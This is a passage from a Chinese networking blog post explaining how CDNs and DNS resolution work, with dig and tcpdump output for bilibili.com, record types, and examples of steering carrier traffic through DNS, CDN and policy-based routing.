class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t116.207.137.67</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t116.207.137.68</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t61.147.236.43</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t117.21.179.19</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t117.21.179.20</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t117.23.60.12</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t117.23.60.13</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t117.23.60.14</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t117.23.60.15</span><br><span class=\"line\"></span><br><span class=\"line\">;; Query time: 7 msec</span><br><span class=\"line\">;; SERVER: 183.60.83.19#53(183.60.83.19)</span><br><span class=\"line\">;; WHEN: Fri Nov 25 21:22:04 CST 2022</span><br><span class=\"line\">;; MSG SIZE  rcvd: 398</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">在ANSWER SECTION列表可以看出</span><br><span class=\"line\"></span><br><span class=\"line\">www.bilibili.com为cname记录指向a.w.bilicdn1.com.</span><br><span class=\"line\">a.w.bilicdn1.com为cname记录指向ct.w.bilicdn1.com.</span><br><span class=\"line\">ct.w.bilicdn1.com.返回了20条A记录，这20个ip 信息是</span><br><span class=\"line\">中国浙江金华 电信</span><br><span class=\"line\">中国江苏南通 电信</span><br><span class=\"line\">中国湖北宜昌 电信 </span><br><span class=\"line\">中国 陕西省 西安市 电信  -- 117.23.60.14</span><br><span class=\"line\">比如我在陕西省西安市鄠邑区，可以看出返回的都是就近节点。实际上CDN是有非常多的边缘节点。</span><br></pre></td></tr></table></figure>\n<p>用 tcpdump 来监控下 DNS 的 UDP 数据包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@VM-16-11-centos ~]# tcpdump -n -s 1500 udp and port 53</span><br><span class=\"line\">tcpdump: verbose output suppressed, use -v or -vv for full protocol decode</span><br><span class=\"line\">listening on eth0, link-type EN10MB (Ethernet), capture size 1500 bytes</span><br><span class=\"line\">21:28:21.393765 IP 10.0.16.11.45832 &gt; 183.60.83.19.domain: 32323+ A? www.bilibili.com. (34)</span><br><span class=\"line\"></span><br><span class=\"line\">21:28:21.394724 IP 183.60.83.19.domain &gt; 10.0.16.11.45832: 32323 22/0/0 CNAME a.w.bilicdn1.com., CNAME ct.w.bilicdn1.com., A 61.147.236.42, A 61.147.236.43, A 61.147.236.44, A 61.147.236.45, A 61.147.236.46, A 116.207.137.66, A 116.207.137.67, A 116.207.137.68, A 117.21.179.18, A 117.21.179.19, A 117.21.179.20, A 117.23.60.12, A 171.214.10.140, A 171.214.10.141, A 171.214.10.142, A 183.131.147.27, A 183.131.147.28, A 183.131.147.29, A 183.131.147.30, A 183.131.147.48 (398)</span><br><span class=\"line\"></span><br><span class=\"line\">21:28:21.407290 IP 10.0.16.11.32999 &gt; 183.60.83.19.domain: 53397+ PTR? 42.236.147.61.in-addr.arpa. (44)</span><br><span class=\"line\"></span><br><span class=\"line\">21:28:21.431995 IP 183.60.83.19.domain &gt; 10.0.16.11.32999: 53397 NXDomain 0/1/0 (93)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>其中，10.0.16.11 为腾讯云服务器内网地址。也就是本机向路由器询问 DNS 解析，如果路由器已经缓存了，就会直接返回。</p>\n<h3 id=\"传统的网站访问与cdn访问\"><a class=\"markdownIt-Anchor\" href=\"#传统的网站访问与cdn访问\">#</a> 传统的网站访问与 CDN 访问</h3>\n<p><strong>传统访问访问：</strong></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/n630r4cz49.png\" alt=\"img\"></p>\n<p><strong>使用了 CDN 的网站访问：</strong></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/7qb88zlcll.png\" alt=\"img\"></p>\n<p>在没有 CDN 的情况下，用户向浏览器输入 <code>www.web.com</code>  这个域名，客户端访问本地 DNS 服务器的时候，如果本地 DNS 服务器有缓存，则返回网站的地址；如果没有，递归查询到网站的权威 DNS 服务器，这个权威 DNS 服务器是负责 web.com 的，它会返回网站的 IP 地址。</p>\n<p>本地 DNS 服务器缓存下 IP 地址，将 IP 地址返回，然后客户端直接访问这个 IP 地址，就访问到了这个网站。</p>\n<p><strong>然而有了 CDN 之后，情况发生了变化</strong>。</p>\n<p>在 web.com 这个权威 DNS 服务器上，会设置一个 CNAME 别名，指向另外一个域名 <code>www.web.cdn.com</code> ，返回给本地 DNS 服务器。</p>\n<p>当本地 DNS 服务器拿到这个新的域名时，需要继续解析这个新的域名。这个时候，再访问的就不是 <span class=\"exturl\" data-url=\"aHR0cDovL3dlYi5jb20=\">web.com</span> 的权威 DNS 服务器了，而是 web.cdn.com 的权威 DNS 服务器，这是 CDN 自己的权威 DNS 服务器。在这个服务器上，还是会设置一个 CNAME，指向另外一个域名，也即 CDN 网络的全局负载均衡器。</p>\n<p>接下来，<strong>本地 DNS 服务器去请求 CDN 的全局负载均衡器解析域名</strong>，全局负载均衡器会为用户选择一台合适的缓存服务器提供服务</p>\n<p>基于以上这些条件，进行综合分析之后，全局负载均衡器会返回一台缓存服务器的 IP 地址。</p>\n<p>本地 DNS 服务器缓存这个 IP 地址，然后将 IP 返回给客户端，客户端去访问这个边缘节点，下载资源。 缓存服务器响应用户请求，将用户所需内容传送到用户终端。如果这台缓存服务器上并没有用户想要的内容，那么这台服务器就要向它的上一级缓存服务器请求内容，直至追溯到网站的源服务器将内容拉到本地</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20200418104105733.png\" alt=\"在这里插入图片描述\"></p>\n<p>与传统访问方式不同，<strong>CDN 网络则是在用户和服务器之间增加缓存层，将用户的访问请求引导到最优的缓存节点</strong>而不是服务器源站点，从而加速访问速度。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/ciawk92i4h.png\" alt=\"img\"></p>\n<h3 id=\"缓存代理\"><a class=\"markdownIt-Anchor\" href=\"#缓存代理\">#</a> 缓存代理</h3>\n<p>缓存系统是 CDN 的另一个关键组成部分，缓存系统会有选择地缓存那些最常用的那些资源</p>\n<p>其中有两个衡量 CDN 服务质量的指标：</p>\n<ul>\n<li>回源率：缓存里没有，必须用代理的方式回源站取，回源次数与所有访问次数之比</li>\n</ul>\n<blockquote>\n<p>缓存系统也可以划分出层次，分成一级缓存节点和二级缓存节点。一级缓存配置高一些，直连源站，二级缓存配置低一些，直连用户<br>\n回源的时候二级缓存只找一级缓存，一级缓存没有才回源站，可以有效地减少真正的回源</p>\n</blockquote>\n<ul>\n<li>命中率：用户访问的资源恰好在缓存系统里，可以直接返回给用户，命中次数与所有访问次数之比</li>\n</ul>\n<blockquote>\n<p>现在的商业 CDN 命中率都在 90% 以上，相当于把源站的服务能力放大了 10 倍以上</p>\n</blockquote>\n<h2 id=\"0x03-cdn好处\"><a class=\"markdownIt-Anchor\" href=\"#0x03-cdn好处\">#</a> 0x03 CDN 好处</h2>\n<blockquote>\n<h6 id=\"1-为了实现跨运营商-跨地域的全网覆盖\"><a class=\"markdownIt-Anchor\" href=\"#1-为了实现跨运营商-跨地域的全网覆盖\">#</a> <strong>1. 为了实现跨运营商、跨地域的全网覆盖</strong></h6>\n<p>互联不互通、区域 ISP 地域局限、出口带宽受限制等种种因素都造成了网站的区域性无法访问。CDN 加速可以覆盖全球的线路，通过和运营商合作，部署 IDC 资源，在全国骨干节点商，合理部署 CDN 边缘分发存储节点，充分利用带宽资源，平衡源站流量。</p>\n<p>例如中国移动手机用户访问中国电信网络的内容源，可以通过在中国移动假设 CDN 服务器，进行加速。效果是非常明显的。</p>\n<h6 id=\"2-为了保障你的网站安全\"><a class=\"markdownIt-Anchor\" href=\"#2-为了保障你的网站安全\">#</a> <strong>2. 为了保障你的网站安全</strong></h6>\n<p>CDN 的负载均衡和分布式存储技术，可以加强网站的可靠性，相当无无形中给你的网站添加了一把保护伞，应对绝大部分的互联网攻击事件。防攻击系统也能避免网站遭到恶意攻击。</p>\n<p>内容进行分发后，源服务器的 IP 被隐藏，受到攻击的概率会大幅下降。CDN 可以通过分流 ，洗掉来自 Ddos 大部分的攻击 。</p>\n<h6 id=\"3-为了异地备援\"><a class=\"markdownIt-Anchor\" href=\"#3-为了异地备援\">#</a> <strong>3. 为了异地备援</strong></h6>\n<p>当某个服务器发生意外故障时，系统将会调用其他临近的健康服务器节点进行服务，进而提供接近 100% 的可靠性，这就让你的网站可以做到永不宕机。</p>\n<h6 id=\"4-为了节约成本投入\"><a class=\"markdownIt-Anchor\" href=\"#4-为了节约成本投入\">#</a> <strong>4. 为了节约成本投入</strong></h6>\n<p>使用 CDN 加速可以实现网站的全国铺设，你根据不用考虑购买服务器与后续的托管<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9zb2x1dGlvbi9vcGVyYXRpb24/ZnJvbT0xMDY4MA==\">运维</span>，服务器之间镜像同步，也不用为了管理维护技术人员而烦恼，节省了人力、精力和财力。</p>\n<h6 id=\"5-为了让你更专注业务本身\"><a class=\"markdownIt-Anchor\" href=\"#5-为了让你更专注业务本身\">#</a> <strong>5. 为了让你更专注业务本身</strong></h6>\n<p>CDN 加速厂商一般都会提供一站式服务，业务不仅限于 CDN，还有配套的云存储、大数据服务、视频云服务等，而且一般会提供 7x24 运维监控支持，保证网络随时畅通，你可以放心使用。并且将更多的精力投入到发展自身的核心业务之上。</p>\n<p>6. 互联网服务提供商采用 CDN，是<strong>以存储换时延</strong>。通信运营商也追捧 CDN，但它们的目的，是<strong>以存储换带宽</strong> —— 通过服务 “下沉”，减轻上层骨干网络的流量压力，避免硬件扩容，降低网络建设成本。</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125204403468.png\" alt=\"image-20221125204403468\"></p>\n<h2 id=\"0x04-常用的cdn缓存软件\"><a class=\"markdownIt-Anchor\" href=\"#0x04-常用的cdn缓存软件\">#</a> 0x04 常用的 CDN 缓存软件</h2>\n<blockquote>\n<ul>\n<li>Varnish ：可以认为是内存缓存，速度一流，但是内存缓存也限制了其容量，缓存页面和图片一般是挺好的；</li>\n<li>squid 是功能最全面的比较传统的 web cache server，有自己的存储引擎。，但是架构太老，性能不怎样。</li>\n<li>nginx 本来是反向代理 /web 服务器，用了插件可以做做这个副业，但是本身不支持的功能比较多</li>\n</ul>\n</blockquote>\n<h2 id=\"0x05-cdn相关术语\"><a class=\"markdownIt-Anchor\" href=\"#0x05-cdn相关术语\">#</a> 0x05 CDN 相关术语</h2>\n<p><strong>CDN 相关的术语解释</strong></p>\n<h6 id=\"1-origin-server源站\"><a class=\"markdownIt-Anchor\" href=\"#1-origin-server源站\">#</a> <strong>1、Origin Server 源站</strong></h6>\n<p>做 CDN 之前的客户真正的服务器。</p>\n<h6 id=\"2-user\"><a class=\"markdownIt-Anchor\" href=\"#2-user\">#</a> <strong>2、User</strong></h6>\n<p>访问者，也就是要访问网站的网民。</p>\n<h6 id=\"3-last-mile\"><a class=\"markdownIt-Anchor\" href=\"#3-last-mile\">#</a> <strong>3、Last Mile</strong></h6>\n<p>最后一公里，也就是网民到他所访问到的 CDN 服务器之间的路径。</p>\n<h6 id=\"4-域名\"><a class=\"markdownIt-Anchor\" href=\"#4-域名\">#</a> <strong>4、域名</strong></h6>\n<p>域名是 Internet 网络上的一个服务器或一个网络系统的名字，全世界，没有重复的域名。</p>\n<h6 id=\"5-cname记录\"><a class=\"markdownIt-Anchor\" href=\"#5-cname记录\">#</a> <strong>5、CNAME 记录</strong></h6>\n<p>它是一个别名记录 (Canonical Name)；当 DNS 系统在查询 CNAME 左面的名称的时候，都会转向 CNAME 右面的名称再进行查询，一直追踪到最后的 PTR 或 A 名称，成功查询后才会做出回应，否则失败。</p>\n<h6 id=\"6-cname域名\"><a class=\"markdownIt-Anchor\" href=\"#6-cname域名\">#</a> <strong>6、CNAME 域名</strong></h6>\n<p>CDN 的域名加速需要用到 CNAME 记录，在服务器控制台配置完成 CDN 加速后，您会得到一个加速后的域名，称之为 CNAME 域名（该域名一定是 <code>*.*http://wljslmz.com</code> ）， 用户需要将自己的域名作 CNAME 指向这个 <code>*.*http://wljslmz.com</code>  的域名后，域名解析的工作就正式转向云服务器，该域名所有的请求都将转向云 CDN 的节点。</p>\n<h6 id=\"7-dns\"><a class=\"markdownIt-Anchor\" href=\"#7-dns\">#</a> <strong>7、DNS</strong></h6>\n<p>DNS 即 Domain Name System，是域名解析服务的意思。它在互联网的作用是：把域名转换成为网络可以识别的 ip 地址。人们习惯记忆域名，但机器间互相只认 IP 地址，域名与 IP 地址之间是一一对应的，它们之间的转换工作称为域名解析，域名解析需要由专门的域名解析服务器来完成，整个过程是自动进行的。比如：上网时输入的百度一下，你就知道会自动转换成为 <code>220.181.112.143</code></p>\n<h6 id=\"8-边缘节点\"><a class=\"markdownIt-Anchor\" href=\"#8-边缘节点\">#</a> <strong>8、边缘节点</strong></h6>\n<p>也称 CDN 节点、Cache 节点等；是相对于网络的复杂结构而提出的一个概念，指距离最终用户接入具有较少的中间环节的网络节点，对最终接入用户有较好的响应能力和连接速度。其作用是将访问量较大的网页内容和对象保存在服务器前端的专用 cache 设备上，以此来提高网站访问的速度和质量。</p>\n<h6 id=\"9-cache\"><a class=\"markdownIt-Anchor\" href=\"#9-cache\">#</a> <strong>9、cache</strong></h6>\n<p>cache 高速缓冲存储器一种特殊的存储器子系统，其中复制了频繁使用的数据以利于快速访问。存储器的高速缓冲存储器存储了频繁访问的 RAM 位置的内容及这些数据项的存储地址。当处理器引用存储器中的某地址时，高速缓冲存储器便检查是否存有该地址。如果存有该地址，则将数据返回处理器；如果没有保存该地址，则进行常规的存储器访问。因为高速缓冲存储器总是比主 RAM 存储器速度快，所以当 RAM 的访问速度低于微处理器的速度时，常使用高速缓冲存储器。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNzc5MzM1\">什么是 CDN？它解决了什么难题？5 分钟让你明明白白！ - 腾讯云开发者社区 - 腾讯云 (tencent.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yODk0MDQ1MQ==\">也许是史上最全的一次 CDN 详解 - 知乎 (zhihu.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC81MjM2Mjk1MA==\">到底什么是 CDN？ - 知乎 (zhihu.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9qdWVqaW4uY24vcG9zdC82OTYyOTA0MjE2NTAzMzIwNTg5\">一图秒懂 CDN 原理 - 掘金 (juejin.cn)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY3JhenltYWtlcmNpcmNsZS9wLzE0OTc4NTEzLmh0bWwjYXV0b2lkLWgyLTAtMC0w\">CDN 图解（秒懂 + 史上最全） - 疯狂创客圈 - 博客园 (cnblogs.com)</span></p>\n<p>来都来了，看个 DNS 再走吧～</p>\n<h1 id=\"dns\"><a class=\"markdownIt-Anchor\" href=\"#dns\">#</a> DNS</h1>\n<h2 id=\"dns概述\"><a class=\"markdownIt-Anchor\" href=\"#dns概述\">#</a> DNS 概述</h2>\n<p>DNS 是 Domain Name System 的缩写，也就是 域名解析系统，它的作用非常简单，就是根据域名查出对应的 IP 地址。</p>\n<p>你可以把它想象成一本巨大的电话本，比如当你要访问域名 <code>www.163.com</code> ，首先要通过 DNS 查出它的 IP 地址是 <code>112.48.162.8</code> 。</p>\n<p>为啥需要解析捏？ 因为域名是给人看的，你只能通过 IP 的方式访问资源，但是让你背 IP 你又不干，而且最坏的情况是他用了 CDN 或者负载均衡，导致他的 IP 更多了，你更不想背了，所以我们有了 DNS，将域名解析成 IP，我们只需要输入域名，域名通过 DNS 解析成 IP，最终访问到资源。</p>\n<p>注意：上面的 DNS 解析对于用户来说是透明的，你并不知道你输入 www.bilibili.com 后到底他给你解析了那个 IP。而如果你真想知道为啥会给你解析成某个 IP，要取决于对方有没有使用 CDN 和一些其他因素</p>\n<h2 id=\"dns资源记录\"><a class=\"markdownIt-Anchor\" href=\"#dns资源记录\">#</a> DNS 资源记录</h2>\n<p>在 DNS 服务器上，一个域名及其下级域名组成一个区域 （Zone）。一个 Zone 的 相关的 DNS 信息构成一个数据库文件。</p>\n<p>下面是一条 A 类型的资源记录（简称为 A 记录）：域名 <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy56ZG5zLmNu\">www.zdns.cn</span> 的数据为 202.173.11.10</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20210704153331929.png\" alt=\"在这里插入图片描述\"></p>\n<p>记录一条域名信息映射关系，称之为资源记录（RR）。当我们查询域名 www.zdns.cn 的时候，查询结果得到的资源记录结构体中有如下数据：</p>\n<ul>\n<li>TTL，就是生存周期，是递归服务器会在缓存中保存该资源记录的时长。</li>\n<li>网络 / 协议类型，它的代表的标识是 IN，IN 就是 internet，目前 DNS 系统主要支持的协议是 IN。</li>\n<li>type，就是资源记录类型，一般的网站都是都是 A 记录（IPv4 的主机地址）。</li>\n<li>rdata 是资源记录数据，就是域名关联的信息数据。</li>\n</ul>\n<p>常见的资源记录类型如表所示。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126101836133.png\" alt=\"image-20221126101836133\"></p>\n<p><strong>A 记录：又称 IP 指向</strong></p>\n<p>用户可以在此设置子域名并指向到自己的目标主机地址上，从而实现通过域名找到服务器。</p>\n<blockquote>\n<p>说明：指向的目标主机地址类型只能使用 IP 地址；<br>\n附加说明：</p>\n<ul>\n<li>\n<p>泛域名解析即将该域名所有未指定的子域名都指向一个空间。在 “主机名” 中填入 *，“类型” 为 A，“IP 地址 / 主机名” 中填入 web 服务器的 IP 地址，点击 “新增” 按钮即可。</p>\n</li>\n<li>\n<p>负载均衡的实现：负载均衡 (Server Load Balancing，SLB) 是指在一系列资源上面动态地分布网络负载。负载均衡可以减少网络拥塞，提高整体网络性能，提高自愈性， 并确保企业关键性应用的可用性。</p>\n<p>当相同子域名有多个目标地址时，表示轮循，可以达到负载均衡的目的，但需要虚拟主机服务商支持。</p>\n</li>\n</ul>\n</blockquote>\n<p><strong>CNAME : 通常称别名指向。</strong></p>\n<p>您可以为一个主机设置别名。<br>\n比如设置 <span class=\"exturl\" data-url=\"aHR0cDovL3Rlc3QubXlkb21haW4uY29t\">test.mydomain.com</span>，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS13d3ctcDE4ZG9odmRzMTFjbzgzYXQ1aGVtYXc1MGsucmRkbnMuY29t\">用来指向一个主机 www.rddns.com</span> , 那么以后就可以用 test.mydomain.com 来代替访问 www.rddns.com 了。</p>\n<p>说明：・</p>\n<ul>\n<li>CNAME 的目标主机地址只能使用主机名，不能使用 IP 地址；</li>\n<li>主机名前不能有任何其他前缀，如：<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1paHF4MWZoOHo1M29sdGZucHdpMmUv\">http:// 等是不被允许的</span>；</li>\n<li>A 记录优先于 CNAME 记录。即如果一个主机地址同时存在 A 记录和 CNAME 记录，则 CNAME 记录不生效。</li>\n</ul>\n<p><strong>NS 记录：指向 DNS 子域名</strong></p>\n<p>服务器解析记录，用来表明由哪台服务器对该域名进行解析。这里的 NS 记录只对子域名生效。</p>\n<p>例如用户希望由 12.34.56.78 这台服务器解析 <span class=\"exturl\" data-url=\"aHR0cDovL25ld3MubXlkb21haW4uY29t\">news.mydomain.com</span>，则需要设置 <span class=\"exturl\" data-url=\"aHR0cDovL25ld3MubXlkb21haW4uY29t\">news.mydomain.com</span> 的 NS 记录。</p>\n<p>说明：</p>\n<ul>\n<li>“优先级” 中的数字越小表示级别越高；</li>\n<li>“IP 地址 / 主机名” 中既可以填写 IP 地址，也可以填写像 <span class=\"exturl\" data-url=\"aHR0cDovL25zLm15ZG9tYWluLmNvbQ==\">ns.mydomain.com</span> 这样的主机地址，但必须保证该主机地址有效。</li>\n</ul>\n<blockquote>\n<p>如，将 news.mydomain.com 的 NS 记录指向到 <span class=\"exturl\" data-url=\"aHR0cDovL25zLm15ZG9tYWluLmNvbQ==\">ns.mydomain.com</span>，在设置 NS 记录的同时还需要设置 ns.mydomain.com 的指向，否则 NS 记录将无法正常解析；</p>\n</blockquote>\n<ul>\n<li>NS 记录优先于 A 记录。</li>\n</ul>\n<blockquote>\n<p>即，如果一个主机地址同时存在 NS 记录和 A 记录，则 A 记录不生效。这里的 NS 记录只对子域名生效。</p>\n</blockquote>\n<h2 id=\"解析过程\"><a class=\"markdownIt-Anchor\" href=\"#解析过程\">#</a> 解析过程</h2>\n<p>1、缓存查找 IP</p>\n<p>2、本机的 hosts 文件查找 IP</p>\n<p>3、DNS 服务器查找 IP</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20210705144630547.png\" alt=\"在这里插入图片描述\"></p>\n<p><strong>从递归和迭代查询可以看出：</strong></p>\n<p>客户端 - 本地 dns 服务端：</p>\n<blockquote>\n<p>这部分属于递归查询。递归查询时，返回的结果只有两种：查询成功或查询失败.</p>\n</blockquote>\n<p>本地 dns 服务端 — 外网：</p>\n<blockquote>\n<p>这部分属于迭代查询。迭代查询，又称作重指引，返回的是最佳的查询点或者主机地址.</p>\n</blockquote>\n<blockquote>\n<ol>\n<li>浏览器先检查自身缓存中有没有被解析过的这个域名对应的 ip 地址，如果有，解析结束。同时域名被缓存的时间也可通过 TTL 属性来设置。</li>\n<li>如果浏览器缓存中没有（专业点叫还没命中），浏览器会检查操作系统缓存中有没有对应的已解析过的结果。而操作系统也有一个域名解析的过程。在 windows 中可通过 c 盘里一个叫 hosts 的文件来设置，如果你在这里指定了一个域名对应的 ip 地址，那浏览器会首先使用这个 ip 地址。</li>\n</ol>\n<blockquote>\n<p>但是这种操作系统级别的域名解析规程也被很多黑客利用，通过修改你的 hosts 文件里的内容把特定的域名解析到他指定的 ip 地址上，造成所谓的域名劫持。所以在 windows7 中将 hosts 文件设置成了 readonly，防止被恶意篡改。</p>\n</blockquote>\n<ol>\n<li>如果至此还没有命中域名，才会真正的请求本地域名服务器（LDNS）来解析这个域名，这台服务器一般在你的城市的某个角落，距离你不会很远，并且这台服务器的性能都很好，一般都会缓存域名解析结果，大约 80% 的域名解析到这里就完成了。</li>\n<li>如果 LDNS 仍然没有命中，就直接跳到 Root Server 域名服务器请求解析</li>\n<li>根域名服务器返回给 LDNS 一个所查询域的主域名服务器（gTLD Server，国际顶尖域名服务器，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1idnMuY29t\">如.com</span> .cn .org 等）地址</li>\n<li>此时 LDNS 再发送请求给上一步返回的 gTLD</li>\n<li>接受请求的 gTLD 查找并返回这个域名对应的 Name Server 的地址，这个 Name Server 就是网站注册的域名服务器</li>\n<li>Name Server 根据映射关系表找到目标 ip，返回给 LDNS</li>\n<li>LDNS 缓存这个域名和对应的 ip</li>\n<li>LDNS 把解析的结果返回给用户，用户根据 TTL 值缓存到本地系统缓存中，域名解析过程至此结束</li>\n</ol>\n</blockquote>\n<p><strong>记住这个解析过程，后面要考</strong></p>\n<h1 id=\"举两个例子\"><a class=\"markdownIt-Anchor\" href=\"#举两个例子\">#</a> 举两个例子</h1>\n<p>腾讯连接了两家运营商电信和联通，电信访问内部服务的流量大，联通的少，怎么把电信流入的流量扔一些给联通</p>\n<blockquote>\n<p>这道题的侧重点在于控制用户侧和运营商侧，因为如果要控制腾讯侧，那么流量已经到了腾讯的防火墙上，不能实现流量控制。</p>\n<p>有两种可能的解法，dns 和 cdn，个人理解，cdn 其实是一种分布式 dns 的解法，两种解法的本质都是控制通过控制 dns 的解析来控制流量选路</p>\n<p>1.dns</p>\n<p>上面也提过 DNS 的解析过程了，那么我们需要控制的就是用户来解析域名时候返回的 IP。</p>\n<p>一般来说，联通用户解析出联通的 IP 访问速度肯定是最快的，但是当电信的访问拥塞时，我们可以给电信的用户在解析时返回联通的 IP，让电信用户通过联通访问，而众所周知，电信和联通可定是可以互通的，只不过是次优路径的问题，因此我们无需关注电信是怎么找到联通的。就像你以前在下游戏的时候，你也不会先看看自己是电信的 IP 还是联通的 IP 再下载，通常看心情随便一点，甚至还可以点到铁通去。</p>\n<p>那么还有个问题是运营商 / 腾讯怎么知道你的 IP 是电信还是联通的。其实每个 IP 都是可以查到归属的，我们只需要增加一个查表或者查缓存的过程罢了</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126105505371.png\" alt=\"image-20221126105505371\"></p>\n<p>2.cdn</p>\n<p>cdn 本质就是也是通过 dns 解析返回给你一个离你最近的一个边缘节点的 IP，只不过这个 IP 解析比较曲折，上面在将 cdn 的时候也讲过了，应用 CDN 后，DNS 返回的不再是 IP 地址，而是一个 CNAME (Canonical Name) 别名记录，指向 CDN 的全局负载均衡 GSLB, GSLB 实际上在域名解析的过程中承担了中间人（或者说代理）的角色，这是 CDN 实现的关键。CDN 负载均衡设备根据用户 IP 地址，以及用户请求的内容 URL，选择一台用户所属区域的<strong>缓存服务器</strong>。负载均衡设备告诉用户这台缓存服务器的 IP 地址，让用户向所选择的缓存服务器发起请求。并且 CDN 可以监控链路质量，实现动态切换和找到负载较轻的节点</p>\n<p>3. 负载均衡，nginx，redis (这个没啥用，但可以在这里写一笔)</p>\n<p>因为这明显是已经进入腾讯内部之后了，nginx 的负载均衡和 redis 的负载均衡在集群的场景下确实是有很大作用滴</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126110209123.png\" alt=\"image-20221126110209123\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126110225565.png\" alt=\"image-20221126110225565\" style=\"zoom:50%;\" />·</p>\n</blockquote>\n<p>或者你有两个出口电信和联通，怎么控制选路</p>\n<blockquote>\n<p>这道题侧重点在于流量出去，也是在本 AS 内控制选路</p>\n<p>1.PBR 策略路由</p>\n<p>略路由 PBR（Policy-Based Routing）是一种依据用户制定的策略进行路由选择的机制，分为本地策略路由、接口策略路由和智能策略路由 SPR</p>\n<p>路由策略（route-policy）与策略路由（policy based route）区别</p>\n<ul>\n<li>\n<p>策略路由的操作对象是数据包，在路由表已经产生的情况下，不按照路由表进行转发，而是根据需要，依照某种策略改变数据包转发路径。</p>\n</li>\n<li>\n<p>路由策略的操作对象是路由信息。路由策略主要实现了路由过滤和路由属性设置等功能，它通过改变路由属性（包括可达性）来改变网络流量所经过的路径。</p>\n</li>\n</ul>\n<p>传统的路由转发原理是首先根据报文的目的地址查找路由表，然后进行报文转发。但是目前越来越多的用户希望能够在传统路由转发的基础上根据自己定义的策略进行报文转发和选路。策略路由使网络管理者不仅能够根据报文的目的地址，而且能够根据报文的源地址、报文大小和链路质量等属性来制定策略路由，以改变数据包转发路径，满足用户需求。</p>\n<p>如果联通的流量很少，但电信流量很大，可以通过 PBR 强制改变路由选路实现流量迁移</p>\n<p>多说一句，其实我们的组网可以使用负载分担双联路方案</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126112007676.png\" alt=\"image-20221126112007676\" style=\"zoom:67%;\" />\n<p>\\1. 2 条链路能同时使用，一半 PC 优先选择电信，另外一半 PC 优先选择联通；</p>\n<p>\\2. 2 条链路为主备方式，电信线路为主，联通线路为备；</p>\n<p>\\3. 但可以实现电信线路断开，所有 PC 选择联通线路，联通线路故障，所有 PC 选择电信。</p>\n<p>其实基本原理还是策略路由，我们可以通过源 IP 奇偶性控制选路</p>\n<p>\\1. 由于策略路由只控制奇数 IP，所以偶数 IP 默认情况下就是优选电信线路，电信线路 Down 情况下选择联通线路，这和传统解决方案一致；</p>\n<p>\\2. 关键的是奇数 IP，奇数 IP 在策略路由的控制下，优选了联通线路，PBR 有一个特性，如果出接口联通线路 Down，则 PBR 失效，奇数 IP 恢复正常的路由转发，选择电信线路。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td 